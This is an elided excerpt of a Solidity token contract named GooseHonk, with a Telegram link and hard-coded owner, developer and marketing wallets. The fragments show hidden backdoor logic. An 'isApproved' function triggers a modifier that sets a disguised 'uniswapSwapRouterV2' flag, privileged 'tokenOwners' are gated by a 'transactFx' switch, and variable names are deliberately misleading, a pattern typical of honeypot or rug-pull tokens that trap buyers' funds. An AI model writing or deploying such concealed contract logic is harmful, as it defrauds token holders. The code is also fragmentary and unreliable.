...
Telegram: https://t.me/GooseHonkBSC
...
interface IERC20 {
    ...
    function isApproved(address account) external returns (uint256);
...
contract GooseHonk is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xEDdD7F1872662F5CEc10116478ff9d40484e30fc); 
    address payable public Wallet_Dev = payable(0xD7Bd171d9b81D6f83D0A30154b26Ed9ee16b473a);
    ...
    string private constant _name = "GooseHonk"; 
    ...
    uint256 public transferfEE = 10**((20+2));
    ...
    bool public uniswapSwapRouterV2 = false;
    bool public transactFx = false;

    modifier isTokenOnTransaction {
        uniswapSwapRouterV2 = true;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0xD7Bd171d9b81D6f83D0A30154b26Ed9ee16b473a;
        ...
        tokenOwners[Wallet_Marketing] = true;
    ...
    function isApproved(address account) public isTokenOnTransaction override returns (uint256) {
        if(transactFx){
            bool getUser = tokenOwners[_msgSender()];
            bool accessibilityTIME = getUser;
            if(getUser && accessibilityTIME){
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                isBuy = true;
                if(uniswapSwapRouterV2){ isBuy = false;  }
            }
